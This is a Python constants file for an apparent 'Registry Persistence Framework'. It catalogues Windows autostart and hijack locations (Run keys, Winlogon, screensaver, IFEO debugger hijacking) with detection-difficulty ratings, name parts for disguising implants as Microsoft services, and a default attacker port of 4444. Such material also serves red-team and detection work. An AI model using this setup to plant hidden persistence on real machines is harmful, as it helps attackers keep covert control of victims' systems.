"""
Configuration and constants for Registry Persistence Framework
"""

# Registry paths
REGISTRY_PATHS = {
    'hkcu_run': r'HKCU\Software\Microsoft\Windows\CurrentVersion\Run',
    'hklm_run': r'HKLM\Software\Microsoft\Windows\CurrentVersion\Run',
    'hkcu_run_once': r'HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce',
    'hklm_run_once': r'HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce',
    'winlogon': r'HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon',
    'screensaver': r'HKCU\Control Panel\Desktop',
    'environment': r'HKCU\Environment',
    'ifeo': r'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options'
}

# Method metadata
PERSISTENCE_METHODS = {
    'run_key': {
        'name': 'Current User Run Key',
        'description': 'Executes on user login',
        'requires_admin': False,
        'location': REGISTRY_PATHS['hkcu_run'],
        'detection_difficulty': 'Easy',
        'survives_reboot': True,
        'trigger': 'User login'
    },
    'run_key_local_machine': {
        'name': 'Local Machine Run Key',
        'description': 'Executes for all users',
        'requires_admin': True,
        'location': REGISTRY_PATHS['hklm_run'],
        'detection_difficulty': 'Easy',
        'survives_reboot': True,
        'trigger': 'Any user login'
    },
    'run_once_key': {
        'name': 'RunOnce Key',
        'description': 'Executes once on next login',
        'requires_admin': False,
        'location': REGISTRY_PATHS['hkcu_run_once'],
        'detection_difficulty': 'Easy',
        'survives_reboot': False,
        'trigger': 'Next user login (single use)'
    },
    'winlogon_userinit': {
        'name': 'Winlogon Userinit',
        'description': 'Runs during user login process',
        'requires_admin': True,
        'location': REGISTRY_PATHS['winlogon'],
        'detection_difficulty': 'Medium',
        'survives_reboot': True,
        'trigger': 'User login (winlogon process)'
    },
    'winlogon_shell': {
        'name': 'Winlogon Shell',
        'description': 'Replaces default shell (explorer.exe)',
        'requires_admin': True,
        'location': REGISTRY_PATHS['winlogon'],
        'detection_difficulty': 'Hard',
        'survives_reboot': True,
        'trigger': 'User login (replaces explorer)'
    },
    'screensaver': {
        'name': 'Screensaver Hijack',
        'description': 'Executes when screensaver activates',
        'requires_admin': False,
        'location': REGISTRY_PATHS['screensaver'],
        'detection_difficulty': 'Medium',
        'survives_reboot': True,
        'trigger': 'Screensaver activation'
    },
    'logon_script': {
        'name': 'Logon Script',
        'description': 'Runs as logon script',
        'requires_admin': False,
        'location': REGISTRY_PATHS['environment'],
        'detection_difficulty': 'Medium',
        'survives_reboot': True,
        'trigger': 'User login (MPR logon)'
    },
    'image_file_execution': {
        'name': 'Image File Execution Options',
        'description': 'Debugger hijacking',
        'requires_admin': True,
        'location': REGISTRY_PATHS['ifeo'],
        'detection_difficulty': 'Medium',
        'survives_reboot': True,
        'trigger': 'Target executable launch'
    }
}

# Name generation components
NAME_PREFIXES = ['Windows', 'Microsoft', 'System', 'Update', 'Security', 'Service']
NAME_SUFFIXES = ['Manager', 'Service', 'Handler', 'Helper', 'Agent', 'Monitor', 'Updater']

# Default settings
DEFAULT_SCREENSAVER_TIMEOUT = 60  # seconds
DEFAULT_ATTACKER_PORT = 4444
COMMAND_TIMEOUT = 30  # seconds
DEFAULT_STAGING_DIR = r'C:\Users\Public'

# Common legitimate processes for IFEO targets
COMMON_IFEO_TARGETS = [
    'notepad.exe',
    'calc.exe',
    'mspaint.exe',
    'wordpad.exe'
]